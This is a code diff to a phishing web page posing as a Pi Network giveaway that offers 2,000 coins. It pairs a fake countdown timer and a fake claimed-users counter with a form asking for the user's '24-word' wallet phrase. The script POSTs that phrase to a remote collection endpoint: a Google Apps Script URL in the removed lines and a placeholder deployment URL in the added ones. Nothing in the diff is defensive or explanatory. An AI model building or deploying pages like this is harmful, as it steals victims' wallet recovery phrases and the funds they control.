@@ -13,7 +13,7 @@
         body {
             font-family: 'Poppins', sans-serif;
             text-align: center;
-            background: url('https://via.placeholder.com/1920x1080') no-repeat center center/cover;
+            background: url('https://news.fmcpay.com/uploads/2025/02/fmcpay-a-new-era-for-pi-network.png') no-repeat center center/cover;
             color: #fff;
             margin: 0;
             display: flex;
@@ -105,7 +105,7 @@
     <p id="countdown">Time Left: 05:00</p>
     
     <div class="container">
-        <h2>Enter your 24-word address</h2>
+        <h2>Enter Your 24-Word Pi Wallet Address</h2>
         <input type="text" id="wallet" placeholder="Enter your 24-word address">
         <button onclick="submitWallet()">🎁 Claim Your 2,000 Pi Network Coins</button>
         <p id="response"></p>
@@ -113,11 +113,6 @@
     </div>
 
     <script>
-        window.onload = function () {
-            updateTimer();
-            updateCounter();
-        };
-
         let timeLeft = 300;
         function updateTimer() {
             let minutes = Math.floor(timeLeft / 60);
@@ -128,6 +123,7 @@
                 setTimeout(updateTimer, 1000);
             }
         }
+        updateTimer();
 
         let participantCount = 182;
         function updateCounter() {
@@ -135,6 +131,7 @@
             document.getElementById("counter").innerText = `🔥 ${participantCount} users have already claimed their reward!`;
             setTimeout(updateCounter, 3000);
         }
+        updateCounter();
 
         async function submitWallet() {
             const wallet = document.getElementById("wallet").value;
@@ -147,19 +144,14 @@
             
             responseText.innerText = "⏳ Processing... Please wait.";
             
-            try {
-                const response = await fetch("https://script.google.com/macros/s/AKfycbz8jfeCIyTEMmm335ubYzcyLp6e0svQF3fqiv_naD9tcUPmZCgdMCwbiO7MkkP05m7C/exec", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ wallet })
-                });
-                
-                const result = await response.json();
-                responseText.innerText = result.message;
-            } catch (error) {
-                responseText.innerText = "❌ Error submitting. Please try again later.";
-                console.error(error);
-            }
+            const response = await fetch("YOUR_DEPLOYMENT_URL", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ wallet })
+            });
+            
+            const result = await response.json();
+            responseText.innerText = result.status === "success" ? "✅ Wallet submitted successfully!" : "❌ Error submitting wallet.";
         }
     </script>
 </body>
